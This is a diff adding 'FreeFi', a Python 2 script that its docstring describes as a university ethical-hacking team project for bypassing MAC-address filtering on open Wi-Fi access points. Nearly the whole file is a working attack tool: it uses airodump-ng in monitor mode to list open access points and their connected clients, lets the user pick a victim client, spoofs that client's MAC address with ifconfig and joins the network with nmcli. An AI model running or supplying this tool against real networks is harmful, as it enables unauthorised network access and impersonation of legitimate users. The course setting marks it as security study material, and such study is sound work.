@@ -1,0 +1,559 @@
+#!/usr/bin/python
+
+# -*- coding: utf-8 -*-
+
+"""
+    FreeFi 
+
+    EthicalHacking Fall 2017 
+    UT Austin
+
+    Bypass MAC based security of Wifi access points
+
+    Team 6: Jonathan Fisher, Kevin Hwang, Steven Ritchie, Kiankris Villagonzalo, Sean Wang 
+
+    Fun extensions to do:
+    - periodically check that wifi is still connected to AP, reconnect if necessary
+    - print IP address of connection
+    - display http traffic of clients
+    - deauth the spoofed client? Not sure if this is necessary.
+    - 
+
+"""
+# Libraries
+import sys
+import subprocess
+import os
+import re
+import random
+import time
+import signal
+import csv
+
+# Globals
+IFACE_NAME               = None
+IFACE_ORIGINAL_MAC_ADDR  = None
+
+IFACE_MAC_ADDR_ANONYMIZED = False
+IFACE_IN_MONITOR_MODE     = False
+IFACE_CONNECTED           = False
+
+# External Programs
+EXT_PROG_IWCONFIG = "iwconfig"
+EXT_PROG_IFCONFIG = "ifconfig"
+EXT_PROG_AIRODUMP = "airodump-ng"
+EXT_PROG_NMCLI    = "nmcli" 
+
+# airodump output files
+AIRODUMP_FILE_NAME_PREFIX = "./ff-airodump-ng"
+AIRODUMP_FILE_NAME_CSV_POSTFIX = "-01.csv"
+AIRODUMP_FILE_NAME_CAP_POSTFIX = "-01.cap"
+
+# constants
+MAX_NUM_ACCESS_POINTS_TO_DISPLAY = 20
+MAX_NUM_CLIENTS_TO_DISPLAY       = 20
+
+# exit codes
+EXIT_CODE_OK    = 0
+EXIT_CODE_ERROR = 1
+
+# Console colors
+WH = '\033[0m'
+RE = '\033[31m'  
+GR = '\033[32m'  
+OR = '\033[33m'  
+BL = '\033[34m'  
+PU = '\033[35m'  
+CY = '\033[36m' 
+
+# Route program outputs to /dev/null by default, but can be changed for debugging
+OUTLOG = open(os.devnull, "w")
+ERRLOG = open(os.devnull, "w")
+
+class AccessPoint:
+    def __init__(self, bssid, channel, privacy, power, essid):
+        self.bssid = bssid
+        self.channel = channel
+        self.privacy = privacy
+        self.power = power
+        self.essid = essid
+
+def print_access_point_data_header():
+    print "   NUM ESSID                            BSSID             CH PRIV PWR"
+    print "   --- -------------------------------- ----------------- -- ---- ---"
+
+def print_access_point_data(row_number, ap):
+    print "   %3s %-32s %17s %2s %-4s %3s" % (str(row_number), ap.essid, ap.bssid, \
+        str(ap.channel), ap.privacy, str(ap.power))
+
+class Client:
+    def __init__(self, client_mac_addr, power, num_packets, access_point_mac_addr):
+        self.client_mac_addr = client_mac_addr
+        self.power = power
+        self.num_packets = num_packets
+        self.access_point_mac_addr = access_point_mac_addr
+
+def print_client_data_header():
+    print "   NUM CLIENT BSSID      PWR #PKTS AP BSSID         "
+    print "   --- ----------------- --- ----- -----------------"
+                
+def print_client_data(row_number, client):
+    print "   %3s %17s %3s %5s %17s" % (str(row_number), client.client_mac_addr, \
+        str(client.power), str(client.num_packets), client.access_point_mac_addr)
+
+def parse_airodump_csv(filename):
+    if not os.path.exists(filename):
+        return ([], [])
+    access_points = []
+    clients = []
+    try:
+        # airodump csv parse state
+        parse_state_header        = 0
+        parse_state_access_points = 1
+        parse_state_clients       = 2
+        parse_state = parse_state_header
+        with open(filename, "rb") as csvfile:
+            reader = csv.reader(csvfile, delimiter=",")
+            for row in reader:
+                if parse_state == parse_state_header:
+                    if len(row) < 1:
+                        continue
+                    if row[0].strip() == "BSSID":
+                        parse_state = parse_state_access_points
+                        continue
+                if parse_state == parse_state_access_points:
+                    if len(row) < 1:
+                        parse_state = parse_state_clients
+                        continue
+                    bssid = row[0].strip()
+                    channel = int(row[3].strip())
+                    privacy = row[5].strip()
+                    power = int(row[8].strip())
+                    if power == -1:
+                        continue
+                    else:
+                        power += 100
+                    essid = row[13].strip()
+                    if channel == -1:
+                        continue
+                    access_points.append(AccessPoint(bssid, channel, privacy, power, essid))
+                if parse_state == parse_state_clients:
+                    if len(row) < 1: # this is probably unnecessary, but doesn't hurt anything
+                        continue
+                    if row[0].strip() == "Station MAC":
+                        continue
+                    client_mac_addr = row[0].strip()
+                    power = int(row[3].strip()) + 100
+                    num_packets = int(row[4].strip())
+                    access_point_mac_addr = row[5].strip()
+                    clients.append(Client(client_mac_addr, power, num_packets, access_point_mac_addr))
+    except IOError:
+        print RE + "[-] error while parsing airodump csv file " + GR + filename + WH
+        clean_shutdown(EXIT_CODE_ERROR)    
+    # sort access_points and cliens by power
+    access_points.sort(key=lambda ap: ap.power, reverse=True)
+    clients.sort(key=lambda c: c.power, reverse=True)
+    return (access_points, clients) 
+
+def kill_subprocess(subproc):
+    # handle killing subprocesses the same way wifite does
+    try:
+        os.kill(subproc.pid, signal.SIGINT)
+    except OSError:
+        pass
+    except TypeError:
+        pass
+    except UnboundLocalError:
+        pass
+    except AttributeError:
+        pass
+    try:
+        os.kill(subproc.pid, signal.SIGTERM)
+    except OSError:
+        pass
+    except UnboundLocalError:
+        pass    
+
+def remove_airodump_files():
+    try:
+        os.remove(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX)
+    except OSError:
+        pass
+    try:
+        os.remove(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CAP_POSTFIX)
+    except OSError:
+        pass
+
+def get_animated_ellipses(num_dots):
+    ellipses = ""
+    for i in xrange(num_dots):
+        ellipses += "."
+    return ellipses
+
+def select_open_access_point_target(iface_name):
+    remove_airodump_files()
+    airodump_command = [EXT_PROG_AIRODUMP, 
+                        "-a",                               # filter unassociated clients
+                        "--write-interval", "1",            # write once a second
+                        "-w", AIRODUMP_FILE_NAME_PREFIX,    # output file prefix
+                        "-o", "csv",                        # only need the csv file
+                        iface_name] 
+    subproc = subprocess.Popen(airodump_command, stdout=OUTLOG, stderr=ERRLOG)
+    # find and display open access points to user
+    open_access_points = None
+    try:
+        scan_count = 0
+        while True:
+            time.sleep(0.6)
+            if not os.path.exists(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX):
+                continue
+            # get data from airodump
+            (access_points, clients) = parse_airodump_csv(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX)
+            # display found access points
+            os.system("clear")
+            print "[+] scanning " + GR + iface_name + WH + \
+                " for open access points, updated every second.\n\n" + GR + "    <CTRL-C>" + WH + " when ready" + \
+                get_animated_ellipses(scan_count % 3 + 1)    
+            print ""
+            # filter for open access points
+            open_access_points = []
+            for ap in access_points:
+                if ap.privacy == "OPN":
+                    open_access_points.append(ap)
+            # print open access points
+            print_access_point_data_header()
+            for i, ap in enumerate(open_access_points):
+                print_access_point_data(i, ap)
+                if i >= MAX_NUM_ACCESS_POINTS_TO_DISPLAY:
+                    break
+            print ""
+            sys.stdout.flush()
+            scan_count += 1
+    except KeyboardInterrupt:
+        pass
+    # kill airodump subprocess
+    kill_subprocess(subproc)
+    remove_airodump_files()
+    # shutdown if no open access points were found
+    if len(open_access_points) < 1:
+        print RE + "[-] No open access points found..." + WH
+        time.sleep(2)
+        clean_shutdown(EXIT_CODE_ERROR) 
+    # let user select access point to target
+    target_access_point_selection = None
+    try:
+        while True:
+            # print open access points
+            os.system("clear")
+            print "[+] Select target access point..."
+            print ""            
+            print_access_point_data_header()
+            for i, ap in enumerate(open_access_points):
+                print_access_point_data(i, ap)
+                if i >= MAX_NUM_ACCESS_POINTS_TO_DISPLAY:
+                    break                
+            print ""
+            sys.stdout.flush()
+            user_input = raw_input(GR + "Enter number of access point to target: " + WH)
+            try:
+                target_access_point_selection = int(user_input)
+            except ValueError:
+                print RE + "\n[-] Invalid input, not a valid number..." + WH
+                time.sleep(2)
+                continue
+            if target_access_point_selection < 0 or target_access_point_selection >= len(open_access_points):
+                print RE + "\n[-] Invalid input, number out of range..." + WH
+                time.sleep(2)
+                continue
+            break
+    except KeyboardInterrupt:
+        print ""
+        clean_shutdown(EXIT_CODE_ERROR)
+    return open_access_points[target_access_point_selection]
+
+def select_client_target(iface_name, target_access_point):
+    remove_airodump_files()
+    airodump_command = [EXT_PROG_AIRODUMP, 
+                        "-a",                                   # filter unassociated clients
+                        "--write-interval", "1",                # write once a second
+                        "-w", AIRODUMP_FILE_NAME_PREFIX,        # output file prefix
+                        "-o", "csv",                            # only need the csv file
+                        "-c", str(target_access_point.channel), # only scan target ap channel
+                        "--bssid", target_access_point.bssid,   # filter for target ap bssid
+                        iface_name] 
+    subproc = subprocess.Popen(airodump_command, stdout=OUTLOG, stderr=ERRLOG)
+    # find and display clients connected to target access point
+    target_clients = None
+    try:
+        scan_count = 0
+        while True:
+            time.sleep(0.6)
+            if not os.path.exists(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX):
+                continue
+            # get data from airodump
+            (access_points, clients) = parse_airodump_csv(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX)
+            # display found access points
+            os.system("clear")
+            print "[+] scanning for clients connected to " + GR + target_access_point.essid + \
+                 WH + ", updated every second.\n\n" + GR + "    <CTRL-C>" + WH + " when ready" + \
+                get_animated_ellipses(scan_count % 3 + 1) 
+            print ""
+            # filter clients by ap bssid
+            target_clients = clients
+            # print clients
+            print_client_data_header()
+            for i, client in enumerate(clients):
+                print_client_data(i, client)
+            print ""
+            sys.stdout.flush()
+            scan_count += 1
+    except KeyboardInterrupt:
+        pass
+    # kill airodump subprocess
+    kill_subprocess(subproc)
+    remove_airodump_files()
+    # shutdown if no target clients were found
+    if len(target_clients) < 1:
+        print RE + "[-] No target clients found..." + WH
+        time.sleep(2)
+        clean_shutdown(EXIT_CODE_ERROR) 
+    # let user select target client
+    target_client_selection = None
+    try:
+        while True:
+            # print target clients
+            os.system("clear")
+            print "[+] Select target client..."
+            print ""            
+            print_client_data_header()
+            for i, client in enumerate(target_clients):
+                print_client_data(i, client)
+            print ""
+            sys.stdout.flush()
+            user_input = raw_input(GR + "Enter number of client to target: " + WH)
+            try:
+                target_client_selection = int(user_input)
+            except ValueError:
+                print RE + "\n[-] Invalid input, not a valid number..." + WH
+                time.sleep(2)
+                continue
+            if target_client_selection < 0 or target_client_selection >= len(target_clients):
+                print RE + "\n[-] Invalid input, number out of range..." + WH
+                time.sleep(2)
+                continue
+            break
+    except KeyboardInterrupt:
+        print ""
+        clean_shutdown(EXIT_CODE_ERROR)
+    return target_clients[target_client_selection]
+
+def disable_monitor_mode(iface_name):
+    print "[+] disabling monitor mode for interface " + GR + IFACE_NAME + WH + "..."
+    subprocess.call([EXT_PROG_IFCONFIG, iface_name, "down"], stdout=OUTLOG, stderr=ERRLOG)        
+    subprocess.call([EXT_PROG_IWCONFIG, iface_name, "mode", "managed"], stdout=OUTLOG, stderr=ERRLOG)        
+    subprocess.call([EXT_PROG_IFCONFIG, iface_name, "up"], stdout=OUTLOG, stderr=ERRLOG)        
+    global IFACE_IN_MONITOR_MODE
+    IFACE_IN_MONITOR_MODE = False 
+    # TODO verify that managed mode was set succesfully
+    return True
+
+def enable_monitor_mode(iface_name):
+    print "[+] enabling monitor mode for interface " + GR + IFACE_NAME + WH + "..." 
+    subprocess.call([EXT_PROG_IFCONFIG, iface_name, "down"], stdout=OUTLOG, stderr=ERRLOG)        
+    subprocess.call([EXT_PROG_IWCONFIG, iface_name, "mode", "monitor"], stdout=OUTLOG, stderr=ERRLOG)        
+    subprocess.call([EXT_PROG_IFCONFIG, iface_name, "up"], stdout=OUTLOG, stderr=ERRLOG)        
+    global IFACE_IN_MONITOR_MODE
+    IFACE_IN_MONITOR_MODE = True 
+    # TODO verify that monitor mode was set succesfully
+    return True
+
+def clean_shutdown(exit_code):
+    print "[+] shutting down..."
+    # undo connection
+    if IFACE_CONNECTED == True:
+        disconnect_from_access_point(IFACE_NAME)
+    # undo monitor mode
+    if IFACE_IN_MONITOR_MODE == True:
+        disable_monitor_mode(IFACE_NAME)
+    # undo mac address change
+    if IFACE_MAC_ADDR_ANONYMIZED == True:
+        print "[+] restoring mac address for interface " + GR + IFACE_NAME + WH + "..."
+        change_mac_address(IFACE_NAME, IFACE_ORIGINAL_MAC_ADDR)
+    print "done\n"
+    sys.exit(exit_code)
+
+def change_mac_address(iface_name, new_mac_addr, silent=False):
+    if silent == False:
+        print "[+] changing mac address to " + CY + new_mac_addr + "..." + WH
+    subprocess.call([EXT_PROG_IFCONFIG, iface_name, "down"], stdout=OUTLOG, stderr=ERRLOG)
+    subproc = subprocess.Popen([EXT_PROG_IFCONFIG, iface_name, 'hw', 'ether', new_mac_addr], stdout=OUTLOG, stderr=ERRLOG)
+    subproc.wait()
+    subprocess.call([EXT_PROG_IFCONFIG, iface_name, "up"], stdout=OUTLOG, stderr=ERRLOG)    
+    return True
+    if get_current_mac_address(iface_name) == new_mac_addr:
+        return True
+    return False
+
+def generate_random_mac_address(curr_mac_addr):
+    # change last 3 bytes of mac addr to keep vender part the same
+    random.seed()
+    new_mac_addr = curr_mac_addr[:9]
+    valid_chars = "0123456789abcdef"
+    for i in xrange(0, 3):   
+        new_mac_addr += valid_chars[random.randint(0, 15)]
+        new_mac_addr += valid_chars[random.randint(0, 15)]
+        if i != 2:
+            new_mac_addr += ":"
+    # make sure new mac addr doesn't match curr mac addr
+    if new_mac_addr == curr_mac_addr:
+        new_mac_addr = generate_random_mac_address(curr_mac_addr)
+    return new_mac_addr
+
+def get_current_mac_address(iface_name):
+    subproc = subprocess.Popen([EXT_PROG_IFCONFIG, iface_name], stdout=subprocess.PIPE, stderr=ERRLOG)
+    subproc.wait()
+    output = subproc.communicate()[0]
+    match = re.search(r"([0-9A-F]{2}[:]){5}[0-9A-F]{2}", output, re.I)
+    if match is not None:
+        return match.group()
+    return None    
+
+def anonymize_mac_address(iface_name):
+    print "[+] anonymizing interface " + GR + iface_name + WH + " mac address..."
+    # get current mac
+    curr_mac_addr = get_current_mac_address(iface_name)
+    if curr_mac_addr is not None:
+        global IFACE_ORIGINAL_MAC_ADDR
+        IFACE_ORIGINAL_MAC_ADDR = curr_mac_addr
+    else:
+        print RE + "[-] failed to anonymize interface " + GR + iface_name + RE + ", mac address not found!" + WH
+        return False
+    # generate random mac addr
+    random_mac_addr = generate_random_mac_address(IFACE_ORIGINAL_MAC_ADDR)
+    # set new mac addr
+    if change_mac_address(iface_name, random_mac_addr) == False:
+        print RE + "[-] failed to anonymize interface " + GR + iface_name + RE + ", could not set new mac address!" + WH
+        return False
+    global IFACE_MAC_ADDR_ANONYMIZED        
+    IFACE_MAC_ADDR_ANONYMIZED = True
+    return True 
+
+"""
+def kill_interfering_processes():
+    print "[+] killing interfering processes..."
+    #subprocess.call([EXT_PROG_AIRMON_NG, "check", "kill"], stdout=OUTLOG, stderr=ERRLOG) 
+    return True;
+"""
+
+def verify_interface_exists(iface_name):
+    print "[+] verifying that interface " + GR + iface_name + WH + " exists..."
+    subproc = subprocess.Popen([EXT_PROG_IWCONFIG, iface_name], stdout=subprocess.PIPE, stderr=ERRLOG)
+    for line in subproc.communicate()[0].split("\n"):
+        if len(line) == 0:
+            continue
+        if ord(line[0]) != 32: # candidate interface name
+            candidate = line[:line.find(" ")]
+            if candidate == iface_name:
+                return True
+    print RE + "[-] interface " + GR + iface_name + RE + " not found!" + WH    
+    return False
+
+def verify_external_programs():
+    # TODO check that external programs are installed here
+    return True
+
+def initialize(iface_name):
+    print "[+] initializing..."
+    if verify_external_programs() == False:
+        return False
+    if verify_interface_exists(iface_name) == False:
+        return False
+    #if kill_interfering_processes() == False:
+    #    return False;
+    if anonymize_mac_address(iface_name) == False:
+        return False
+    if enable_monitor_mode(iface_name) == False:
+        return False
+    return True
+
+def connect_to_access_point(access_point):
+    print "[+] Connecting to access point " + GR + access_point.essid + WH + "..."
+    command = [EXT_PROG_NMCLI, "device", "wifi", "connect", access_point.essid]
+    subprocess.call(command, stdout=OUTLOG, stderr=ERRLOG)
+    global IFACE_CONNECTED
+    IFACE_CONNECTED = True
+
+def disconnect_from_access_point(iface_name):
+    print "[+] Disconnecting from access point on interface " + GR + iface_name + WH + "..."
+    command = [EXT_PROG_NMCLI, "device", "disconnect", iface_name]
+    subprocess.call(command, stdout=OUTLOG, stderr=ERRLOG)
+    global IFACE_CONNECTED
+    IFACE_CONNECTED = False
+
+def setup_connection_and_wait(iface_name, target_access_point, target_client):
+    os.system("clear")
+    print "[+] Setting up connection..."
+    disable_monitor_mode(iface_name)
+    change_mac_address(IFACE_NAME, target_client.client_mac_addr)
+    time.sleep(3)
+    connect_to_access_point(target_access_point)
+    scan_count = 0
+    try:
+        while True:
+            time.sleep(0.6)
+            os.system("clear")
+            print "[+] Connected to " + GR + target_access_point.essid + WH + " with mac address " + \
+                CY + target_access_point.bssid + WH + ",\n" + "    client mac address is " + CY + \
+                target_client.client_mac_addr + ".\n\n" + GR + "    <CTRL-C>" + WH + " when done" + get_animated_ellipses(scan_count % 3 + 1) 
+            scan_count += 1
+    except KeyboardInterrupt:
+        print ""
+        pass
+
+def show_banner():
+    os.system("clear")
+    print GR
+    print " /$$$$$$$$                            /$$$$$$$$ /$$"
+    print "| $$_____/                           | $$_____/|__/"
+    print "| $$     /$$$$$$   /$$$$$$   /$$$$$$ | $$       /$$"
+    print "| $$$$$ /$$__  $$ /$$__  $$ /$$__  $$| $$$$$   | $$"
+    print "| $$__/| $$  \__/| $$$$$$$$| $$$$$$$$| $$__/   | $$"
+    print "| $$   | $$      | $$_____/| $$_____/| $$      | $$"
+    print "| $$   | $$      |  $$$$$$$|  $$$$$$$| $$      | $$"
+    print "|__/   |__/       \_______/ \_______/|__/      |__/"
+    print BL
+    print "           Information Wants to Be Free!           "
+    print WH
+    
+def print_help():
+    print "Usage: FreeFi <interface>\n"
+
+def handle_arguments():
+    if len(sys.argv) < 2:
+        print_help()
+        return False
+    global IFACE_NAME
+    IFACE_NAME = sys.argv[1]
+    return True
+
+if __name__ == '__main__':
+    if handle_arguments() == False:
+        sys.exit()
+    try:
+        show_banner()
+        disconnect_from_access_point(IFACE_NAME) # TODO prob remove this by making init more robust
+        disable_monitor_mode(IFACE_NAME) # TODO prob remove this by making init more robust
+        if initialize(IFACE_NAME) == True:
+            target_access_point = select_open_access_point_target(IFACE_NAME)
+            target_client = select_client_target(IFACE_NAME, target_access_point)
+            setup_connection_and_wait(IFACE_NAME, target_access_point, target_client)   
+    except KeyboardInterrupt:
+        print RE + "\n(^C) interrupted!" + WH
+    except EOFError:
+        print RE + "\n(^D) interrupted!" + WH
+    clean_shutdown(EXIT_CODE_OK)
+
+
+
+
+
